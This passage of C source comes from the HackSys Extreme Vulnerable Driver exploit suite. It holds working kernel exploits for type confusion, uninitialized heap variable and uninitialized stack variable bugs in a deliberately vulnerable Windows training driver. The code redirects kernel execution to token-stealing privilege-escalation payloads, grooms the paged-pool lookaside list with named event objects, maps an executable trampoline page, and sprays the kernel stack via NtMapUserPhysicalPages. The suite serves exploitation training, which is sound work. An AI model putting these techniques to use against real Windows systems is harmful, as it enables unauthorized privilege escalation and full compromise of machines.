                        NULL,
                        0,
                        &BytesReturned,
                        NULL);

        OutputDebugString("****************Kernel Mode****************\n");
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        DEBUG_ERROR("\t\t[-] Exception: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    return EXIT_SUCCESS;
}

```

`Exploit/StackOverflowGS.h`:

```h
/*++

          ##     ## ######## ##     ## ########  
          ##     ## ##       ##     ## ##     ## 
          ##     ## ##       ##     ## ##     ## 
          ######### ######   ##     ## ##     ## 
          ##     ## ##        ##   ##  ##     ## 
          ##     ## ##         ## ##   ##     ## 
          ##     ## ########    ###    ########  

        HackSys Extreme Vulnerable Driver Exploit

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    StackOverflowGS.h

Abstract:
    This module implements the data structures used by the
    exploit for Stack Overflow Vulnerability protected by
    GS cookies implemented in HackSys Extreme Vulnerable
    Driver.

--*/

#ifndef __STACK_OVERFLOW_GS_H__
    #define __STACK_OVERFLOW_GS_H__

    #pragma once

    #include "Common.h"

    #define RAISE_EXCEPTION_IN_KERNEL_MODE 0x4
    #define SHARED_MEMORY_NAME "HackSysExtremeVulnerableDriverSharedMemory"

    DWORD WINAPI    StackOverflowGSThread(LPVOID Parameter);

#endif  //__STACK_OVERFLOW_GS_H__

```

`Exploit/TypeConfusion.c`:

```c
/*++

          ##     ## ######## ##     ## ########  
          ##     ## ##       ##     ## ##     ## 
          ##     ## ##       ##     ## ##     ## 
          ######### ######   ##     ## ##     ## 
          ##     ## ##        ##   ##  ##     ## 
          ##     ## ##         ## ##   ##     ## 
          ##     ## ########    ###    ########  

        HackSys Extreme Vulnerable Driver Exploit

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    TypeConfusion.c

Abstract:
    This module implements the exploit for Type Confusion
    Vulnerability implemented in HackSys Extreme Vulnerable
    Driver.

--*/

#include "TypeConfusion.h"

DWORD WINAPI TypeConfusionThread(LPVOID Parameter) {
    HANDLE hFile = NULL;
    ULONG BytesReturned;
    LPCSTR FileName = (LPCSTR)DEVICE_NAME;
    PVOID EopPayload = &TokenStealingPayloadWin7Generic;
    PUSER_TYPE_CONFUSION_OBJECT UserTypeConfusionObject = NULL;

    __try {
        // Get the device handle
        DEBUG_MESSAGE("\t[+] Getting Device Driver Handle\n");
        DEBUG_INFO("\t\t[+] Device Name: %s\n", FileName);

        hFile = GetDeviceHandle(FileName);

        if (hFile == INVALID_HANDLE_VALUE) {
            DEBUG_ERROR("\t\t[-] Failed Getting Device Handle: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
        else {
            DEBUG_INFO("\t\t[+] Device Handle: 0x%X\n", hFile);
        }

        DEBUG_MESSAGE("\t[+] Setting Up Vulnerability Stage\n");

        DEBUG_INFO("\t\t[+] Allocating Memory For USER_TYPE_CONFUSION_OBJECT\n");

        // Allocate the Heap chunk
        UserTypeConfusionObject = (PUSER_TYPE_CONFUSION_OBJECT)HeapAlloc(GetProcessHeap(),
                                                                         HEAP_ZERO_MEMORY,
                                                                         sizeof(USER_TYPE_CONFUSION_OBJECT));

        if (!UserTypeConfusionObject) {
            DEBUG_ERROR("\t\t\t[-] Failed To Allocate Memory: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
        else {
            DEBUG_INFO("\t\t\t[+] Memory Allocated: 0x%p\n", UserTypeConfusionObject);
            DEBUG_INFO("\t\t\t[+] Allocation Size: 0x%X\n", sizeof(USER_TYPE_CONFUSION_OBJECT));
        }

        DEBUG_INFO("\t\t[+] Preparing USER_TYPE_CONFUSION_OBJECT structure\n");

        UserTypeConfusionObject->objectID = (ULONG_PTR)0x01;
        UserTypeConfusionObject->objectType = (ULONG_PTR)EopPayload;

        DEBUG_INFO("\t\t\t[+] UserTypeConfusionObject: 0x%p\n", UserTypeConfusionObject);
        DEBUG_INFO("\t\t\t[+] UserTypeConfusionObject->objectID: 0x%p\n", UserTypeConfusionObject->objectID);
        DEBUG_INFO("\t\t\t[+] UserTypeConfusionObject->objectType: 0x%p\n", UserTypeConfusionObject->objectType);

        DEBUG_INFO("\t\t[+] EoP Payload: 0x%p\n", EopPayload);

        DEBUG_MESSAGE("\t[+] Triggering Kernel Type Confusion\n");

        OutputDebugString("****************Kernel Mode****************\n");

        DeviceIoControl(hFile,
                        HACKSYS_EVD_IOCTL_TYPE_CONFUSION,
                        (LPVOID)UserTypeConfusionObject,
                        sizeof(USER_TYPE_CONFUSION_OBJECT),
                        NULL,
                        0,
                        &BytesReturned,
                        NULL);

        OutputDebugString("****************Kernel Mode****************\n");

        HeapFree(GetProcessHeap(), 0, (LPVOID)UserTypeConfusionObject);

        UserTypeConfusionObject = NULL;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        DEBUG_ERROR("\t\t[-] Exception: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    return EXIT_SUCCESS;
}

```

`Exploit/TypeConfusion.h`:

```h
/*++

          ##     ## ######## ##     ## ########  
          ##     ## ##       ##     ## ##     ## 
          ##     ## ##       ##     ## ##     ## 
          ######### ######   ##     ## ##     ## 
          ##     ## ##        ##   ##  ##     ## 
          ##     ## ##         ## ##   ##     ## 
          ##     ## ########    ###    ########  

        HackSys Extreme Vulnerable Driver Exploit

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    TypeConfusion.h

Abstract:
    This module implements the data structures used by the
    exploit for Type Confusion Vulnerability implemented in
    HackSys Extreme Vulnerable Driver.

--*/

#ifndef __TYPE_CONFUSION_H__
    #define __TYPE_CONFUSION_H__

    #pragma once

    #include "Common.h"

    typedef struct _USER_TYPE_CONFUSION_OBJECT {
        ULONG_PTR objectID;
        ULONG_PTR objectType;
    } USER_TYPE_CONFUSION_OBJECT, *PUSER_TYPE_CONFUSION_OBJECT;

    DWORD WINAPI    TypeConfusionThread(LPVOID Parameter);

#endif  //__TYPE_CONFUSION_H__

```

`Exploit/UninitializedHeapVariable.c`:

```c
/*++

          ##     ## ######## ##     ## ########  
          ##     ## ##       ##     ## ##     ## 
          ##     ## ##       ##     ## ##     ## 
          ######### ######   ##     ## ##     ## 
          ##     ## ##        ##   ##  ##     ## 
          ##     ## ##         ## ##   ##     ## 
          ##     ## ########    ###    ########  

        HackSys Extreme Vulnerable Driver Exploit

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    UninitializedHeapVariable.c

Abstract:
    This module implements the exploit for Uninitialized
    Heap Variable Vulnerability implemented in HackSys
    Extreme Vulnerable Driver.

References:
    https://github.com/badd1e/bug-free-adventure/blob/master/uninitialized-pool/hacksys-challenge-Win7.cpp
    http://dokydoky.tistory.com/445

--*/

#include "UninitializedHeapVariable.h"

VOID GenerateObjectNameWithPayloadTrampoline(UCHAR Name[], UINT32 Length, ULONG_PTR Pivot) {
    UINT32 i = 0;

    for (i = 0; i < Length; i++) {
        Name[i] = RandomNumber(0x41, 0x5A); // From A-Z
    }

    Name[4] = (UINT_PTR)Pivot & 0xFF;
    Name[5] = ((UINT_PTR)Pivot & 0xFF00) >> 8;
    Name[6] = ((UINT_PTR)Pivot & 0xFF0000) >> 16;
    Name[7] = (UINT_PTR)Pivot >> 24;

    Name[Length - 1] = '\0';
}

ULONG_PTR MapPivotPage(PVOID Payload) {
    ULONG_PTR Pivot = 0;
    PVOID BaseAddress = NULL;
    SIZE_T RegionSize = 0x1;
    BOOLEAN PivotMapped = FALSE;
    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;

    while (!PivotMapped) {
        Pivot = RandomNumber(0x41, 0x4F) & 0xFF;
        Pivot |= (RandomNumber(0x31, 0x3F) & 0xFF) << 8;
        Pivot |= (RandomNumber(0x21, 0x2F) & 0xFF) << 16;
        Pivot |= (RandomNumber(0x11, 0x1F) & 0xFF) << 24;

        BaseAddress = (PVOID)Pivot;

        NtStatus = NtAllocateVirtualMemory((HANDLE)0xFFFFFFFF,
                                           &BaseAddress,
                                           0,
                                           &RegionSize,
                                           MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN,
                                           PAGE_EXECUTE_READWRITE);

        if (NtStatus == STATUS_SUCCESS) {
            *(PBYTE)Pivot = 0x68;                           // push 32b imm
            *(PULONG_PTR)(Pivot + 1) = (ULONG_PTR)Payload;
            *(PBYTE)(Pivot + 5) = 0xC3;                     // ret

            PivotMapped = TRUE;

            DEBUG_INFO("\t\t\t[+] Memory Allocated: 0x%p\n", BaseAddress);
            DEBUG_INFO("\t\t\t[+] Allocation Size: 0x%X\n", RegionSize);
            DEBUG_INFO("\t\t\t[+] Payload Trampoline: 0x%p\n", Pivot);
        }
    }

    return Pivot;
}

VOID PopulateLookAsideList(PVOID Payload) {
    UINT32 i = 0;
    ULONG_PTR Pivot = 0;
    UCHAR EventName[MAX_OBJECT_NAME_LENGTH] = { 0 };
    HANDLE EventObjects[MAX_CHUNKS_IN_LAL_BUCKET] = { 0 };

    // Initialize the Random Number Generator
    srand((unsigned)time(NULL));

    Pivot = MapPivotPage(Payload);

    /*
     We know that each bucket in LookAsideList can not hold more than 256 free chunks.

     As we are dealing with Named Objects, one of the caveat is, if same static string
     is passed to consecutive calls to Object constructor as Object Name, then only one
     Pool chunk will be served for all the requests. This will not allow us to populate
     LookAsideList and the exploitation will fail.

     To overcome this issue, we need to make sure that the string is random for each call
     to Object constructor.

     So, to populate the LookAsideList, allocate 256 objects of same size and then free them.
    */

    for (i = 0; i < MAX_CHUNKS_IN_LAL_BUCKET; i++) {
        GenerateObjectNameWithPayloadTrampoline(EventName,
                                                sizeof(EventName) - UNICODE_TERMINATOR_LENGTH,
                                                Pivot);

        EventObjects[i] = CreateEventW(NULL, FALSE, FALSE, (LPCWSTR)EventName);

        if (!EventObjects[i]) {
            DEBUG_ERROR("\t\t[-] Failed To Allocate Event Objects: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
    }

    for (i = 0; i < 256; i++) {
        if (!CloseHandle(EventObjects[i])) {
            DEBUG_ERROR("\t\t[-] Failed To Close Event Object Handle: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
    }
}

VOID WaitForLookAsideListActivation() {
    ULONG TickCount = 0;
    ULONG TickCountDifference = 0;
    ULONG TargetTickCount = 125000; // 2 minutes + 30 seconds (extra)

    // Get the tick count
    TickCount = GetTickCount();

    if (TickCount > TargetTickCount) {
        DEBUG_INFO("\t\t\t[+] LookAsideList is already activated\n");
    }
    else {
        TickCountDifference = TargetTickCount - TickCount;

        DEBUG_INFO("\t\t\t[+] Waiting %d seconds for LookAsideList activation\n", TickCountDifference/1000);

        Sleep(TickCountDifference);

        DEBUG_INFO("\t\t\t[+] LookAsideList is now activated\n");
    }
}

DWORD WINAPI UninitializedHeapVariableThread(LPVOID Parameter) {
    UINT32 i = 0;
    ULONG BytesReturned;
    HANDLE hFile = NULL;
    ULONG_PTR MagicValue = 0xBAADF00D;
    LPCSTR FileName = (LPCSTR)DEVICE_NAME;
    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
    PVOID EopPayload = &TokenStealingPayloadDuplicateToken;

    __try {
        // Get the device handle
        DEBUG_MESSAGE("\t[+] Getting Device Driver Handle\n");
        DEBUG_INFO("\t\t[+] Device Name: %s\n", FileName);

        hFile = GetDeviceHandle(FileName);

        if (hFile == INVALID_HANDLE_VALUE) {
            DEBUG_ERROR("\t\t[-] Failed Getting Device Handle: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
        else {
            DEBUG_INFO("\t\t[+] Device Handle: 0x%X\n", hFile);
        }

        /*
         This is a very interesting bug. At first, it seems to be a very easy bug to exploit.
         However, we need to solve some challenges.

         Challenges
            1. Grooming Paged Pool (4 Paged Pool in Uniprocessor System)
            2. Preparing Target Pool Chunk with controlled data

         We know that vulnerability is like call [address + 4]. So, this is very important
         for exploitation. As we know that when a pool chunk is freed to ListHeads, POOL_HEADER
         is immediately followed by LIST_ENTRY structure which is used to track the pool chunk.

         If you remember, LIST_ENTRY is of 8 bytes. Hence, if the Pool chunk is freed to ListHeads
         then the exploitation will fail as call [LIST_ENTRY.Blink] will throw an exception.

         For successful exploitation, the target pool chunk should be freed to LookAsideList because
         chunks in LookAsideList are tracked using SLIST_ENTRY which has only one member.
        */

        DEBUG_MESSAGE("\t[+] Setting Up Vulnerability Stage\n");

        // Resolve Kernel Symbols
        ResolveKernelAPIs();

        /*
         First stage of exploitation is to make sure that LookAsideList is activated.

         If you have read Tarjei's paper on "Kernel Pool Exploitation on Windows 7", you will
         know that LookAsideList is lazy activated 2 minutes after boot.

         Ref: http://gate.upm.ro/os/LABs/Windows_OS_Internals_Curriculum_Resource_Kit-ACADEMIC/WindowsResearchKernel-WRK/WRK-v1.2/base/ntos/ex/pool.c

         So, let's make sure that 2 minutes have elapsed after boot or wait for the same.
        */

        DEBUG_INFO("\t\t[+] Checking LookAsideList activation status\n");

        WaitForLookAsideListActivation();

        /*
         Next stage of exploitation is to make sure that _KPRCB.PPPagedLookasideList[0x1E]
         ((((0xF0+0xF) >> 3) - 1) = 0x1E) is populated.

         If the payload address contains NULL, then the exploitation will fail. So, make sure
         there is no NULL in the payload address.
        */

        DEBUG_INFO("\t\t[+] Populating _KPRCB.PPPagedLookasideList[0x1E]\n");

        PopulateLookAsideList(EopPayload);

        DEBUG_INFO("\t\t[+] EoP Payload: 0x%p\n", EopPayload);

        DEBUG_MESSAGE("\t[+] Triggering Use of Uninitialized Heap Variable\n");

        OutputDebugString("****************Kernel Mode****************\n");

        DeviceIoControl(hFile,
                        HACKSYS_EVD_IOCTL_UNINITIALIZED_HEAP_VARIABLE,
                        (LPVOID)&MagicValue,
                        0,
                        NULL,
                        0,
                        &BytesReturned,
                        NULL);

        OutputDebugString("****************Kernel Mode****************\n");
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        DEBUG_ERROR("\t\t[-] Exception: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    return EXIT_SUCCESS;
}

```

`Exploit/UninitializedHeapVariable.h`:

```h
/*++

          ##     ## ######## ##     ## ########  
          ##     ## ##       ##     ## ##     ## 
          ##     ## ##       ##     ## ##     ## 
          ######### ######   ##     ## ##     ## 
          ##     ## ##        ##   ##  ##     ## 
          ##     ## ##         ## ##   ##     ## 
          ##     ## ########    ###    ########  

        HackSys Extreme Vulnerable Driver Exploit

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    UninitializedHeapVariable.h

Abstract:
    This module implements the data structures used by the
    exploit for Uninitialized Heap Variable Vulnerability
    implemented in HackSys Extreme Vulnerable Driver.

--*/

#ifndef __UNINITIALIZED_HEAP_VARIABLE_H__
    #define __UNINITIALIZED_HEAP_VARIABLE_H__

    #pragma once

    #include "Common.h"

    #define MAX_OBJECT_NAME_LENGTH 0xF0
    #define MAX_CHUNKS_IN_LAL_BUCKET 256
    #define UNICODE_TERMINATOR_LENGTH 0x4

    VOID            WaitForLookAsideListActivation();
    VOID            PopulateLookAsideList(PVOID Payload);
    DWORD WINAPI    UninitializedHeapVariableThread(LPVOID Parameter);
    VOID            GenerateObjectNameWithPayloadTrampoline(UCHAR Name[], UINT32 Length, ULONG_PTR Pivot);

#endif  //__UNINITIALIZED_HEAP_VARIABLE_H__

```

`Exploit/UninitializedStackVariable.c`:

```c
/*++

          ##     ## ######## ##     ## ########  
          ##     ## ##       ##     ## ##     ## 
          ##     ## ##       ##     ## ##     ## 
          ######### ######   ##     ## ##     ## 
          ##     ## ##        ##   ##  ##     ## 
          ##     ## ##         ## ##   ##     ## 
          ##     ## ########    ###    ########  

        HackSys Extreme Vulnerable Driver Exploit

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    UninitializedStackVariable.c

Abstract:
    This module implements the exploit for Uninitialized
    Stack Variable Vulnerability implemented in HackSys
    Extreme Vulnerable Driver.

--*/

#include "UninitializedStackVariable.h"

DWORD WINAPI UninitializedStackVariableThread(LPVOID Parameter) {
    UINT32 i = 0;
    ULONG BytesReturned;
    HANDLE hFile = NULL;
    ULONG MagicValue = 0xBAADF00D;
    PULONG StackSprayBuffer = NULL;
    LPCSTR FileName = (LPCSTR)DEVICE_NAME;
    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
    PVOID EopPayload = &TokenStealingPayloadDuplicateToken;
    SIZE_T StackSprayBufferSize = 1024 * sizeof(ULONG_PTR);

    __try {
        // Get the device handle
        DEBUG_MESSAGE("\t[+] Getting Device Driver Handle\n");
        DEBUG_INFO("\t\t[+] Device Name: %s\n", FileName);

        hFile = GetDeviceHandle(FileName);

        if (hFile == INVALID_HANDLE_VALUE) {
            DEBUG_ERROR("\t\t[-] Failed Getting Device Handle: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
        else {
            DEBUG_INFO("\t\t[+] Device Handle: 0x%X\n", hFile);
        }

        DEBUG_MESSAGE("\t[+] Setting Up Vulnerability Stage\n");

        DEBUG_INFO("\t\t[+] Allocating Memory For Buffer\n");

        StackSprayBuffer = (PULONG)HeapAlloc(GetProcessHeap(),
                                             HEAP_ZERO_MEMORY,
                                             StackSprayBufferSize);

        if (!StackSprayBuffer) {
            DEBUG_ERROR("\t\t\t[-] Failed To Allocate Memory: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
        else {
            DEBUG_INFO("\t\t\t[+] Memory Allocated: 0x%p\n", StackSprayBuffer);
            DEBUG_INFO("\t\t\t[+] Allocation Size: 0x%X\n", StackSprayBufferSize);
        }

        DEBUG_INFO("\t\t[+] Preparing Buffer Memory Layout\n");

        for(i = 0; i < StackSprayBufferSize / sizeof(ULONG_PTR); i++) {
            StackSprayBuffer[i] = (ULONG)EopPayload;
        }

        DEBUG_INFO("\t\t[+] EoP Payload: 0x%p\n", EopPayload);

        ResolveKernelAPIs();

        DEBUG_INFO("\t\t[+] Spraying the Kernel Stack\n");
        DEBUG_MESSAGE("\t[+] Triggering Use of Uninitialized Stack Variable\n");

        OutputDebugString("****************Kernel Mode****************\n");

        // HackSys Extreme Vulnerable driver itself provides a decent interface
        // to spray the stack using Stack Overflow vulnerability. However, j00ru
        // on his blog disclosed a Windows API that can be used to spray stack up to
        // 1024*sizeof(ULONG_PTR) bytes (http://j00ru.vexillium.org/?p=769). Since,
        // it's a Windows API and available on Windows by default, I decided to use
        // it instead of this driver's Stack Overflow interface.
        NtMapUserPhysicalPages(NULL, 1024, StackSprayBuffer);

        // Kernel Stack should not be used for anything else as it
        // will corrupt the current sprayed state. So, we will directly
        // trigger the vulnerability without putting any Debug prints.
        DeviceIoControl(hFile,
                        HACKSYS_EVD_IOCTL_UNINITIALIZED_STACK_VARIABLE,
                        (LPVOID)&MagicValue,
                        0,
                        NULL,
                        0,
                        &BytesReturned,
                        NULL);

        OutputDebugString("****************Kernel Mode****************\n");

        HeapFree(GetProcessHeap(), 0, (LPVOID)StackSprayBuffer);

        StackSprayBuffer = NULL;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        DEBUG_ERROR("\t\t[-] Exception: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    return EXIT_SUCCESS;
}

```

`Exploit/UninitializedStackVariable.h`:

```h
/*++

          ##     ## ######## ##     ## ########  
          ##     ## ##       ##     ## ##     ## 
          ##     ## ##       ##     ## ##     ## 
          ######### ######   ##     ## ##     ## 
          ##     ## ##        ##   ##  ##     ## 
          ##     ## ##         ## ##   ##     ## 
          ##     ## ########    ###    ########  

        HackSys Extreme Vulnerable Driver Exploit

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

